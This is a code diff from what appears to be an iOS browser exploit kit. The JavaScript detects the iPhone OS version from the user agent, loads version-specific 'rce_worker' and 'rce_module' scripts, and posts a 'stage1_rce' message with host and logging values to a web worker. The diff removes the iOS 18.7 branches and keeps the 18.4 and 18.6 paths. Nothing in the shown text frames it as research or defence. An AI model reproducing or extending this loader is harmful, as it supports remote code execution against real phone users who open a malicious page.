@@ -84,8 +84,6 @@ let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
 let workerCode = "";
 if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
     workerCode = await getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
-else if(ios_version == '18,7' || ios_version == '18,7,1' || ios_version == '18,7,2')
-    workerCode = await getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
 else
     workerCode = await getJS(`rce_worker_18.4.js?${Date.now()}`); // local version
 let workerBlob = new Blob([workerCode],{type:'text/javascript'});
@@ -182,8 +180,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         let rceCode = "";
         if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
                 rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
-        else if(ios_version == '18,7' || ios_version == '18,7,1' || ios_version == '18,7,2')
-                rceCode = getJS(`rce_module_18.7.js?${Date.now()}`); // local version
             else
                 rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
         try
@@ -197,14 +193,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         let desiredHost = "";
         desiredHost = localHost;
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
-            {
-                worker.postMessage({
-                    type: 'stage1_rce',
-                    desiredHost,
-                    randomValues,
-                    SERVER_LOG
-                });
-            }else if(ios_version == '18,7' || ios_version == '18,7,1' || ios_version == '18,7,2')
             {
                 worker.postMessage({
                     type: 'stage1_rce',
